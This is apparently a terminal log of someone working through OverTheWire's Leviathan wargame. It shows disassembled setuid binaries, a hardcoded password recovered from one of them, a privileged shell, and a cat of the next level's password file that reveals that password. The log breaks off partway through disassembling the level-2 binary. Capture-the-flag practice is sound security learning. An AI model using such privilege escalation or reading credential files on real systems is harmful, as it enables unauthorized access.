 80483c1:	81 c3 3f 1c 00 00    	add    ebx,0x1c3f
 80483c7:	8b 83 fc ff ff ff    	mov    eax,DWORD PTR [ebx-0x4]
 80483cd:	85 c0                	test   eax,eax
 80483cf:	74 05                	je     80483d6 <_init+0x1e>
 80483d1:	e8 aa 00 00 00       	call   8048480 <__libc_start_main@plt+0x10>
 80483d6:	83 c4 08             	add    esp,0x8
 80483d9:	5b                   	pop    ebx
 80483da:	c3                   	ret

Disassembly of section .plt:

080483e0 <strcmp@plt-0x10>:
 80483e0:	ff 35 04 a0 04 08    	push   DWORD PTR ds:0x804a004
 80483e6:	ff 25 08 a0 04 08    	jmp    DWORD PTR ds:0x804a008
 80483ec:	00 00                	add    BYTE PTR [eax],al
	...

080483f0 <strcmp@plt>:
 80483f0:	ff 25 0c a0 04 08    	jmp    DWORD PTR ds:0x804a00c
 80483f6:	68 00 00 00 00       	push   0x0
 80483fb:	e9 e0 ff ff ff       	jmp    80483e0 <_init+0x28>

08048400 <printf@plt>:
 8048400:	ff 25 10 a0 04 08    	jmp    DWORD PTR ds:0x804a010
 8048406:	68 08 00 00 00       	push   0x8
 804840b:	e9 d0 ff ff ff       	jmp    80483e0 <_init+0x28>

08048410 <getchar@plt>:
 8048410:	ff 25 14 a0 04 08    	jmp    DWORD PTR ds:0x804a014
 8048416:	68 10 00 00 00       	push   0x10
 804841b:	e9 c0 ff ff ff       	jmp    80483e0 <_init+0x28>

08048420 <__stack_chk_fail@plt>:
 8048420:	ff 25 18 a0 04 08    	jmp    DWORD PTR ds:0x804a018
 8048426:	68 18 00 00 00       	push   0x18
 804842b:	e9 b0 ff ff ff       	jmp    80483e0 <_init+0x28>

08048430 <geteuid@plt>:
 8048430:	ff 25 1c a0 04 08    	jmp    DWORD PTR ds:0x804a01c
 8048436:	68 20 00 00 00       	push   0x20
 804843b:	e9 a0 ff ff ff       	jmp    80483e0 <_init+0x28>

08048440 <puts@plt>:
 8048440:	ff 25 20 a0 04 08    	jmp    DWORD PTR ds:0x804a020
 8048446:	68 28 00 00 00       	push   0x28
 804844b:	e9 90 ff ff ff       	jmp    80483e0 <_init+0x28>

08048450 <system@plt>:
 8048450:	ff 25 24 a0 04 08    	jmp    DWORD PTR ds:0x804a024
 8048456:	68 30 00 00 00       	push   0x30
 804845b:	e9 80 ff ff ff       	jmp    80483e0 <_init+0x28>

08048460 <setreuid@plt>:
 8048460:	ff 25 28 a0 04 08    	jmp    DWORD PTR ds:0x804a028
 8048466:	68 38 00 00 00       	push   0x38
 804846b:	e9 70 ff ff ff       	jmp    80483e0 <_init+0x28>

08048470 <__libc_start_main@plt>:
 8048470:	ff 25 2c a0 04 08    	jmp    DWORD PTR ds:0x804a02c
 8048476:	68 40 00 00 00       	push   0x40
 804847b:	e9 60 ff ff ff       	jmp    80483e0 <_init+0x28>

Disassembly of section .plt.got:

08048480 <.plt.got>:
 8048480:	ff 25 fc 9f 04 08    	jmp    DWORD PTR ds:0x8049ffc
 8048486:	66 90                	xchg   ax,ax

Disassembly of section .text:

08048490 <_start>:
 8048490:	31 ed                	xor    ebp,ebp
 8048492:	5e                   	pop    esi
 8048493:	89 e1                	mov    ecx,esp
 8048495:	83 e4 f0             	and    esp,0xfffffff0
 8048498:	50                   	push   eax
 8048499:	54                   	push   esp
 804849a:	52                   	push   edx
 804849b:	68 d0 86 04 08       	push   0x80486d0
 80484a0:	68 70 86 04 08       	push   0x8048670
 80484a5:	51                   	push   ecx
 80484a6:	56                   	push   esi
 80484a7:	68 8d 85 04 08       	push   0x804858d
 80484ac:	e8 bf ff ff ff       	call   8048470 <__libc_start_main@plt>
 80484b1:	f4                   	hlt
 80484b2:	66 90                	xchg   ax,ax
 80484b4:	66 90                	xchg   ax,ax
 80484b6:	66 90                	xchg   ax,ax
 80484b8:	66 90                	xchg   ax,ax
 80484ba:	66 90                	xchg   ax,ax
 80484bc:	66 90                	xchg   ax,ax
 80484be:	66 90                	xchg   ax,ax

080484c0 <__x86.get_pc_thunk.bx>:
 80484c0:	8b 1c 24             	mov    ebx,DWORD PTR [esp]
 80484c3:	c3                   	ret
 80484c4:	66 90                	xchg   ax,ax
 80484c6:	66 90                	xchg   ax,ax
 80484c8:	66 90                	xchg   ax,ax
 80484ca:	66 90                	xchg   ax,ax
 80484cc:	66 90                	xchg   ax,ax
 80484ce:	66 90                	xchg   ax,ax

080484d0 <deregister_tm_clones>:
 80484d0:	b8 3b a0 04 08       	mov    eax,0x804a03b
 80484d5:	2d 38 a0 04 08       	sub    eax,0x804a038
 80484da:	83 f8 06             	cmp    eax,0x6
 80484dd:	77 01                	ja     80484e0 <deregister_tm_clones+0x10>
 80484df:	c3                   	ret
 80484e0:	b8 00 00 00 00       	mov    eax,0x0
 80484e5:	85 c0                	test   eax,eax
 80484e7:	74 f6                	je     80484df <deregister_tm_clones+0xf>
 80484e9:	55                   	push   ebp
 80484ea:	89 e5                	mov    ebp,esp
 80484ec:	83 ec 18             	sub    esp,0x18
 80484ef:	c7 04 24 38 a0 04 08 	mov    DWORD PTR [esp],0x804a038
 80484f6:	ff d0                	call   eax
 80484f8:	c9                   	leave
 80484f9:	c3                   	ret
 80484fa:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]

08048500 <register_tm_clones>:
 8048500:	b8 38 a0 04 08       	mov    eax,0x804a038
 8048505:	2d 38 a0 04 08       	sub    eax,0x804a038
 804850a:	c1 f8 02             	sar    eax,0x2
 804850d:	89 c2                	mov    edx,eax
 804850f:	c1 ea 1f             	shr    edx,0x1f
 8048512:	01 d0                	add    eax,edx
 8048514:	d1 f8                	sar    eax,1
 8048516:	75 01                	jne    8048519 <register_tm_clones+0x19>
 8048518:	c3                   	ret
 8048519:	ba 00 00 00 00       	mov    edx,0x0
 804851e:	85 d2                	test   edx,edx
 8048520:	74 f6                	je     8048518 <register_tm_clones+0x18>
 8048522:	55                   	push   ebp
 8048523:	89 e5                	mov    ebp,esp
 8048525:	83 ec 18             	sub    esp,0x18
 8048528:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 804852c:	c7 04 24 38 a0 04 08 	mov    DWORD PTR [esp],0x804a038
 8048533:	ff d2                	call   edx
 8048535:	c9                   	leave
 8048536:	c3                   	ret
 8048537:	89 f6                	mov    esi,esi
 8048539:	8d bc 27 00 00 00 00 	lea    edi,[edi+eiz*1+0x0]

08048540 <__do_global_dtors_aux>:
 8048540:	80 3d 38 a0 04 08 00 	cmp    BYTE PTR ds:0x804a038,0x0
 8048547:	75 13                	jne    804855c <__do_global_dtors_aux+0x1c>
 8048549:	55                   	push   ebp
 804854a:	89 e5                	mov    ebp,esp
 804854c:	83 ec 08             	sub    esp,0x8
 804854f:	e8 7c ff ff ff       	call   80484d0 <deregister_tm_clones>
 8048554:	c6 05 38 a0 04 08 01 	mov    BYTE PTR ds:0x804a038,0x1
 804855b:	c9                   	leave
 804855c:	f3 c3                	repz ret
 804855e:	66 90                	xchg   ax,ax

08048560 <frame_dummy>:
 8048560:	a1 10 9f 04 08       	mov    eax,ds:0x8049f10
 8048565:	85 c0                	test   eax,eax
 8048567:	74 1f                	je     8048588 <frame_dummy+0x28>
 8048569:	b8 00 00 00 00       	mov    eax,0x0
 804856e:	85 c0                	test   eax,eax
 8048570:	74 16                	je     8048588 <frame_dummy+0x28>
 8048572:	55                   	push   ebp
 8048573:	89 e5                	mov    ebp,esp
 8048575:	83 ec 18             	sub    esp,0x18
 8048578:	c7 04 24 10 9f 04 08 	mov    DWORD PTR [esp],0x8049f10
 804857f:	ff d0                	call   eax
 8048581:	c9                   	leave
 8048582:	e9 79 ff ff ff       	jmp    8048500 <register_tm_clones>
 8048587:	90                   	nop
 8048588:	e9 73 ff ff ff       	jmp    8048500 <register_tm_clones>

0804858d <main>:
 804858d:	55                   	push   ebp
 804858e:	89 e5                	mov    ebp,esp
 8048590:	53                   	push   ebx
 8048591:	83 e4 f0             	and    esp,0xfffffff0
 8048594:	83 ec 30             	sub    esp,0x30
 8048597:	65 a1 14 00 00 00    	mov    eax,gs:0x14
 804859d:	89 44 24 2c          	mov    DWORD PTR [esp+0x2c],eax
 80485a1:	31 c0                	xor    eax,eax
 80485a3:	c7 44 24 18 73 65 78 	mov    DWORD PTR [esp+0x18],0x786573
 80485aa:	00
 80485ab:	c7 44 24 25 73 65 63 	mov    DWORD PTR [esp+0x25],0x72636573
 80485b2:	72
 80485b3:	66 c7 44 24 29 65 74 	mov    WORD PTR [esp+0x29],0x7465
 80485ba:	c6 44 24 2b 00       	mov    BYTE PTR [esp+0x2b],0x0
 80485bf:	c7 44 24 1c 67 6f 64 	mov    DWORD PTR [esp+0x1c],0x646f67
 80485c6:	00
 80485c7:	c7 44 24 20 6c 6f 76 	mov    DWORD PTR [esp+0x20],0x65766f6c
 80485ce:	65
 80485cf:	c6 44 24 24 00       	mov    BYTE PTR [esp+0x24],0x0
 80485d4:	c7 04 24 f0 86 04 08 	mov    DWORD PTR [esp],0x80486f0
 80485db:	e8 20 fe ff ff       	call   8048400 <printf@plt>
 80485e0:	e8 2b fe ff ff       	call   8048410 <getchar@plt>
 80485e5:	88 44 24 14          	mov    BYTE PTR [esp+0x14],al
 80485e9:	e8 22 fe ff ff       	call   8048410 <getchar@plt>
 80485ee:	88 44 24 15          	mov    BYTE PTR [esp+0x15],al
 80485f2:	e8 19 fe ff ff       	call   8048410 <getchar@plt>
 80485f7:	88 44 24 16          	mov    BYTE PTR [esp+0x16],al
 80485fb:	c6 44 24 17 00       	mov    BYTE PTR [esp+0x17],0x0
 8048600:	8d 44 24 18          	lea    eax,[esp+0x18]
 8048604:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048608:	8d 44 24 14          	lea    eax,[esp+0x14]
 804860c:	89 04 24             	mov    DWORD PTR [esp],eax
 804860f:	e8 dc fd ff ff       	call   80483f0 <strcmp@plt>
 8048614:	85 c0                	test   eax,eax
 8048616:	75 26                	jne    804863e <main+0xb1>
 8048618:	e8 13 fe ff ff       	call   8048430 <geteuid@plt>
 804861d:	89 c3                	mov    ebx,eax
 804861f:	e8 0c fe ff ff       	call   8048430 <geteuid@plt>
 8048624:	89 5c 24 04          	mov    DWORD PTR [esp+0x4],ebx
 8048628:	89 04 24             	mov    DWORD PTR [esp],eax
 804862b:	e8 30 fe ff ff       	call   8048460 <setreuid@plt>
 8048630:	c7 04 24 fb 86 04 08 	mov    DWORD PTR [esp],0x80486fb
 8048637:	e8 14 fe ff ff       	call   8048450 <system@plt>
 804863c:	eb 0c                	jmp    804864a <main+0xbd>
 804863e:	c7 04 24 03 87 04 08 	mov    DWORD PTR [esp],0x8048703
 8048645:	e8 f6 fd ff ff       	call   8048440 <puts@plt>
 804864a:	b8 00 00 00 00       	mov    eax,0x0
 804864f:	8b 54 24 2c          	mov    edx,DWORD PTR [esp+0x2c]
 8048653:	65 33 15 14 00 00 00 	xor    edx,DWORD PTR gs:0x14
 804865a:	74 05                	je     8048661 <main+0xd4>
 804865c:	e8 bf fd ff ff       	call   8048420 <__stack_chk_fail@plt>
 8048661:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 8048664:	c9                   	leave
 8048665:	c3                   	ret
 8048666:	66 90                	xchg   ax,ax
 8048668:	66 90                	xchg   ax,ax
 804866a:	66 90                	xchg   ax,ax
 804866c:	66 90                	xchg   ax,ax
 804866e:	66 90                	xchg   ax,ax

08048670 <__libc_csu_init>:
 8048670:	55                   	push   ebp
 8048671:	57                   	push   edi
 8048672:	56                   	push   esi
 8048673:	53                   	push   ebx
 8048674:	e8 47 fe ff ff       	call   80484c0 <__x86.get_pc_thunk.bx>
 8048679:	81 c3 87 19 00 00    	add    ebx,0x1987
 804867f:	83 ec 0c             	sub    esp,0xc
 8048682:	8b 6c 24 20          	mov    ebp,DWORD PTR [esp+0x20]
 8048686:	8d b3 0c ff ff ff    	lea    esi,[ebx-0xf4]
 804868c:	e8 27 fd ff ff       	call   80483b8 <_init>
 8048691:	8d 83 08 ff ff ff    	lea    eax,[ebx-0xf8]
 8048697:	29 c6                	sub    esi,eax
 8048699:	c1 fe 02             	sar    esi,0x2
 804869c:	85 f6                	test   esi,esi
 804869e:	74 25                	je     80486c5 <__libc_csu_init+0x55>
 80486a0:	31 ff                	xor    edi,edi
 80486a2:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]
 80486a8:	83 ec 04             	sub    esp,0x4
 80486ab:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 80486af:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 80486b3:	55                   	push   ebp
 80486b4:	ff 94 bb 08 ff ff ff 	call   DWORD PTR [ebx+edi*4-0xf8]
 80486bb:	83 c7 01             	add    edi,0x1
 80486be:	83 c4 10             	add    esp,0x10
 80486c1:	39 f7                	cmp    edi,esi
 80486c3:	75 e3                	jne    80486a8 <__libc_csu_init+0x38>
 80486c5:	83 c4 0c             	add    esp,0xc
 80486c8:	5b                   	pop    ebx
 80486c9:	5e                   	pop    esi
 80486ca:	5f                   	pop    edi
 80486cb:	5d                   	pop    ebp
 80486cc:	c3                   	ret
 80486cd:	8d 76 00             	lea    esi,[esi+0x0]

080486d0 <__libc_csu_fini>:
 80486d0:	f3 c3                	repz ret

Disassembly of section .fini:

080486d4 <_fini>:
 80486d4:	53                   	push   ebx
 80486d5:	83 ec 08             	sub    esp,0x8
 80486d8:	e8 e3 fd ff ff       	call   80484c0 <__x86.get_pc_thunk.bx>
 80486dd:	81 c3 23 19 00 00    	add    ebx,0x1923
 80486e3:	83 c4 08             	add    esp,0x8
 80486e6:	5b                   	pop    ebx
 80486e7:	c3                   	ret
leviathan1@leviathan:~$ r2bin 0x786573
r2bin: command not found
leviathan1@leviathan:~$ ./check
password: sex
$ ls
check
$ bash
leviathan2@leviathan:~$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
leviathan2@leviathan:~$ exit
exit
$ exit
leviathan1@leviathan:~$ exit
logout
Connection to leviathan.labs.overthewire.org closed.
➜  ~ ssh leviathan2@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan2@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan2@leviathan:~$ ll
total 28
drwxr-xr-x  2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan3 leviathan2 7596 Nov 13 16:03 printfile*
leviathan2@leviathan:~$ objdump -d -Minterl printfile

printfile:     file format elf32-i386


Disassembly of section .init:

080483b4 <_init>:
 80483b4:	53                   	push   %ebx
 80483b5:	83 ec 08             	sub    $0x8,%esp
 80483b8:	e8 03 01 00 00       	call   80484c0 <__x86.get_pc_thunk.bx>
 80483bd:	81 c3 43 1c 00 00    	add    $0x1c43,%ebx
 80483c3:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 80483c9:	85 c0                	test   %eax,%eax
 80483cb:	74 05                	je     80483d2 <_init+0x1e>
 80483cd:	e8 ae 00 00 00       	call   8048480 <access@plt+0x10>
 80483d2:	83 c4 08             	add    $0x8,%esp
 80483d5:	5b                   	pop    %ebx
 80483d6:	c3                   	ret

Disassembly of section .plt:

080483e0 <printf@plt-0x10>:
 80483e0:	ff 35 04 a0 04 08    	pushl  0x804a004
 80483e6:	ff 25 08 a0 04 08    	jmp    *0x804a008
 80483ec:	00 00                	add    %al,(%eax)
	...

080483f0 <printf@plt>:
 80483f0:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 80483f6:	68 00 00 00 00       	push   $0x0
 80483fb:	e9 e0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048400 <__stack_chk_fail@plt>:
 8048400:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048406:	68 08 00 00 00       	push   $0x8
 804840b:	e9 d0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048410 <geteuid@plt>:
 8048410:	ff 25 14 a0 04 08    	jmp    *0x804a014
 8048416:	68 10 00 00 00       	push   $0x10
 804841b:	e9 c0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048420 <puts@plt>:
 8048420:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048426:	68 18 00 00 00       	push   $0x18
 804842b:	e9 b0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048430 <system@plt>:
 8048430:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 8048436:	68 20 00 00 00       	push   $0x20
 804843b:	e9 a0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048440 <setreuid@plt>:
 8048440:	ff 25 20 a0 04 08    	jmp    *0x804a020
 8048446:	68 28 00 00 00       	push   $0x28
 804844b:	e9 90 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048450 <__libc_start_main@plt>:
 8048450:	ff 25 24 a0 04 08    	jmp    *0x804a024
 8048456:	68 30 00 00 00       	push   $0x30
 804845b:	e9 80 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048460 <snprintf@plt>:
 8048460:	ff 25 28 a0 04 08    	jmp    *0x804a028
 8048466:	68 38 00 00 00       	push   $0x38
 804846b:	e9 70 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048470 <access@plt>:
 8048470:	ff 25 2c a0 04 08    	jmp    *0x804a02c
 8048476:	68 40 00 00 00       	push   $0x40
 804847b:	e9 60 ff ff ff       	jmp    80483e0 <_init+0x2c>

Disassembly of section .plt.got:

08048480 <.plt.got>:
 8048480:	ff 25 fc 9f 04 08    	jmp    *0x8049ffc
 8048486:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

08048490 <_start>:
 8048490:	31 ed                	xor    %ebp,%ebp
 8048492:	5e                   	pop    %esi
 8048493:	89 e1                	mov    %esp,%ecx
 8048495:	83 e4 f0             	and    $0xfffffff0,%esp
 8048498:	50                   	push   %eax
 8048499:	54                   	push   %esp
 804849a:	52                   	push   %edx
 804849b:	68 e0 86 04 08       	push   $0x80486e0
 80484a0:	68 80 86 04 08       	push   $0x8048680
 80484a5:	51                   	push   %ecx
 80484a6:	56                   	push   %esi
 80484a7:	68 8d 85 04 08       	push   $0x804858d
 80484ac:	e8 9f ff ff ff       	call   8048450 <__libc_start_main@plt>
 80484b1:	f4                   	hlt
 80484b2:	66 90                	xchg   %ax,%ax
 80484b4:	66 90                	xchg   %ax,%ax
 80484b6:	66 90                	xchg   %ax,%ax
 80484b8:	66 90                	xchg   %ax,%ax
 80484ba:	66 90                	xchg   %ax,%ax
 80484bc:	66 90                	xchg   %ax,%ax
 80484be:	66 90                	xchg   %ax,%ax

080484c0 <__x86.get_pc_thunk.bx>:
 80484c0:	8b 1c 24             	mov    (%esp),%ebx
 80484c3:	c3                   	ret
 80484c4:	66 90                	xchg   %ax,%ax
 80484c6:	66 90                	xchg   %ax,%ax
 80484c8:	66 90                	xchg   %ax,%ax
 80484ca:	66 90                	xchg   %ax,%ax
 80484cc:	66 90                	xchg   %ax,%ax
 80484ce:	66 90                	xchg   %ax,%ax

080484d0 <deregister_tm_clones>:
 80484d0:	b8 3b a0 04 08       	mov    $0x804a03b,%eax
 80484d5:	2d 38 a0 04 08       	sub    $0x804a038,%eax
 80484da:	83 f8 06             	cmp    $0x6,%eax
 80484dd:	77 01                	ja     80484e0 <deregister_tm_clones+0x10>
 80484df:	c3                   	ret
 80484e0:	b8 00 00 00 00       	mov    $0x0,%eax
 80484e5:	85 c0                	test   %eax,%eax
 80484e7:	74 f6                	je     80484df <deregister_tm_clones+0xf>
 80484e9:	55                   	push   %ebp
 80484ea:	89 e5                	mov    %esp,%ebp
 80484ec:	83 ec 18             	sub    $0x18,%esp
 80484ef:	c7 04 24 38 a0 04 08 	movl   $0x804a038,(%esp)
 80484f6:	ff d0                	call   *%eax
 80484f8:	c9                   	leave
 80484f9:	c3                   	ret
 80484fa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

08048500 <register_tm_clones>:
 8048500:	b8 38 a0 04 08       	mov    $0x804a038,%eax
 8048505:	2d 38 a0 04 08       	sub    $0x804a038,%eax
 804850a:	c1 f8 02             	sar    $0x2,%eax
 804850d:	89 c2                	mov    %eax,%edx
 804850f:	c1 ea 1f             	shr    $0x1f,%edx
 8048512:	01 d0                	add    %edx,%eax
 8048514:	d1 f8                	sar    %eax
 8048516:	75 01                	jne    8048519 <register_tm_clones+0x19>
 8048518:	c3                   	ret
 8048519:	ba 00 00 00 00       	mov    $0x0,%edx
 804851e:	85 d2                	test   %edx,%edx
 8048520:	74 f6                	je     8048518 <register_tm_clones+0x18>
 8048522:	55                   	push   %ebp
 8048523:	89 e5                	mov    %esp,%ebp
 8048525:	83 ec 18             	sub    $0x18,%esp
 8048528:	89 44 24 04          	mov    %eax,0x4(%esp)
 804852c:	c7 04 24 38 a0 04 08 	movl   $0x804a038,(%esp)
 8048533:	ff d2                	call   *%edx
 8048535:	c9                   	leave
 8048536:	c3                   	ret
 8048537:	89 f6                	mov    %esi,%esi
 8048539:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

08048540 <__do_global_dtors_aux>:
 8048540:	80 3d 38 a0 04 08 00 	cmpb   $0x0,0x804a038
 8048547:	75 13                	jne    804855c <__do_global_dtors_aux+0x1c>
 8048549:	55                   	push   %ebp
 804854a:	89 e5                	mov    %esp,%ebp
 804854c:	83 ec 08             	sub    $0x8,%esp
 804854f:	e8 7c ff ff ff       	call   80484d0 <deregister_tm_clones>
 8048554:	c6 05 38 a0 04 08 01 	movb   $0x1,0x804a038
 804855b:	c9                   	leave
 804855c:	f3 c3                	repz ret
 804855e:	66 90                	xchg   %ax,%ax

08048560 <frame_dummy>:
 8048560:	a1 10 9f 04 08       	mov    0x8049f10,%eax
 8048565:	85 c0                	test   %eax,%eax
 8048567:	74 1f                	je     8048588 <frame_dummy+0x28>
 8048569:	b8 00 00 00 00       	mov    $0x0,%eax
 804856e:	85 c0                	test   %eax,%eax
 8048570:	74 16                	je     8048588 <frame_dummy+0x28>
 8048572:	55                   	push   %ebp
 8048573:	89 e5                	mov    %esp,%ebp
 8048575:	83 ec 18             	sub    $0x18,%esp
 8048578:	c7 04 24 10 9f 04 08 	movl   $0x8049f10,(%esp)
 804857f:	ff d0                	call   *%eax
 8048581:	c9                   	leave
 8048582:	e9 79 ff ff ff       	jmp    8048500 <register_tm_clones>
 8048587:	90                   	nop
 8048588:	e9 73 ff ff ff       	jmp    8048500 <register_tm_clones>

0804858d <main>:
 804858d:	55                   	push   %ebp
 804858e:	89 e5                	mov    %esp,%ebp
 8048590:	53                   	push   %ebx
 8048591:	83 e4 f0             	and    $0xfffffff0,%esp
 8048594:	81 ec 30 02 00 00    	sub    $0x230,%esp
 804859a:	8b 45 0c             	mov    0xc(%ebp),%eax
 804859d:	89 44 24 1c          	mov    %eax,0x1c(%esp)
 80485a1:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 80485a7:	89 84 24 2c 02 00 00 	mov    %eax,0x22c(%esp)
 80485ae:	31 c0                	xor    %eax,%eax
 80485b0:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
 80485b4:	7f 2c                	jg     80485e2 <main+0x55>
 80485b6:	c7 04 24 00 87 04 08 	movl   $0x8048700,(%esp)
 80485bd:	e8 5e fe ff ff       	call   8048420 <puts@plt>
 80485c2:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80485c6:	8b 00                	mov    (%eax),%eax
 80485c8:	89 44 24 04          	mov    %eax,0x4(%esp)
 80485cc:	c7 04 24 15 87 04 08 	movl   $0x8048715,(%esp)
 80485d3:	e8 18 fe ff ff       	call   80483f0 <printf@plt>
 80485d8:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
 80485dd:	e9 82 00 00 00       	jmp    8048664 <main+0xd7>
 80485e2:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80485e6:	83 c0 04             	add    $0x4,%eax
 80485e9:	8b 00                	mov    (%eax),%eax
 80485eb:	c7 44 24 04 04 00 00 	movl   $0x4,0x4(%esp)
 80485f2:	00
 80485f3:	89 04 24             	mov    %eax,(%esp)
 80485f6:	e8 75 fe ff ff       	call   8048470 <access@plt>
 80485fb:	85 c0                	test   %eax,%eax
 80485fd:	74 13                	je     8048612 <main+0x85>
 80485ff:	c7 04 24 29 87 04 08 	movl   $0x8048729,(%esp)
 8048606:	e8 15 fe ff ff       	call   8048420 <puts@plt>
 804860b:	b8 01 00 00 00       	mov    $0x1,%eax
 8048610:	eb 52                	jmp    8048664 <main+0xd7>
 8048612:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048616:	83 c0 04             	add    $0x4,%eax
 8048619:	8b 00                	mov    (%eax),%eax
 804861b:	89 44 24 0c          	mov    %eax,0xc(%esp)
 804861f:	c7 44 24 08 44 87 04 	movl   $0x8048744,0x8(%esp)
 8048626:	08
 8048627:	c7 44 24 04 ff 01 00 	movl   $0x1ff,0x4(%esp)
 804862e:	00
 804862f:	8d 44 24 2c          	lea    0x2c(%esp),%eax
 8048633:	89 04 24             	mov    %eax,(%esp)
 8048636:	e8 25 fe ff ff       	call   8048460 <snprintf@plt>
 804863b:	e8 d0 fd ff ff       	call   8048410 <geteuid@plt>
 8048640:	89 c3                	mov    %eax,%ebx
 8048642:	e8 c9 fd ff ff       	call   8048410 <geteuid@plt>
 8048647:	89 5c 24 04          	mov    %ebx,0x4(%esp)
 804864b:	89 04 24             	mov    %eax,(%esp)
 804864e:	e8 ed fd ff ff       	call   8048440 <setreuid@plt>
 8048653:	8d 44 24 2c          	lea    0x2c(%esp),%eax
 8048657:	89 04 24             	mov    %eax,(%esp)
 804865a:	e8 d1 fd ff ff       	call   8048430 <system@plt>
 804865f:	b8 00 00 00 00       	mov    $0x0,%eax
 8048664:	8b 94 24 2c 02 00 00 	mov    0x22c(%esp),%edx
 804866b:	65 33 15 14 00 00 00 	xor    %gs:0x14,%edx
 8048672:	74 05                	je     8048679 <main+0xec>
 8048674:	e8 87 fd ff ff       	call   8048400 <__stack_chk_fail@plt>
 8048679:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 804867c:	c9                   	leave
 804867d:	c3                   	ret
 804867e:	66 90                	xchg   %ax,%ax

08048680 <__libc_csu_init>:
 8048680:	55                   	push   %ebp
 8048681:	57                   	push   %edi
 8048682:	56                   	push   %esi
 8048683:	53                   	push   %ebx
 8048684:	e8 37 fe ff ff       	call   80484c0 <__x86.get_pc_thunk.bx>
 8048689:	81 c3 77 19 00 00    	add    $0x1977,%ebx
 804868f:	83 ec 0c             	sub    $0xc,%esp
 8048692:	8b 6c 24 20          	mov    0x20(%esp),%ebp
 8048696:	8d b3 0c ff ff ff    	lea    -0xf4(%ebx),%esi
 804869c:	e8 13 fd ff ff       	call   80483b4 <_init>
 80486a1:	8d 83 08 ff ff ff    	lea    -0xf8(%ebx),%eax
 80486a7:	29 c6                	sub    %eax,%esi
 80486a9:	c1 fe 02             	sar    $0x2,%esi
 80486ac:	85 f6                	test   %esi,%esi
 80486ae:	74 25                	je     80486d5 <__libc_csu_init+0x55>
 80486b0:	31 ff                	xor    %edi,%edi
 80486b2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 80486b8:	83 ec 04             	sub    $0x4,%esp
